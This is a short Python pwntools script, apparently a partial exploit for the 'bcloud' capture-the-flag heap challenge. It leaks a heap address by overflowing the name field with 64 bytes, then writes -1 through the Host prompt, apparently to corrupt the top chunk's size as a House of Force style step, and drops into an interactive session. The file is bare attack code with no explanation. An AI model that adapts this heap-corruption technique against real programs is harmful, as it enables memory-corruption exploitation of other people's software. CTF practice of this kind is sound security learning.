from pwn import *

p = process("./bcloud", env={'LD_PRELOAD': 'libc-2.19.so'})

p.sendlineafter("name:\n", b"a"*64)
p.recvuntil("a"*64)
heap = u32(p.recv(4).ljust(4, b"\x00"))
log.info("HEAP:     %s" %(hex(heap)))
p.sendafter("Org:\n", b'a'*64)
p.sendlineafter("Host:\n", p32(-1, signed=True))
p.interactive()
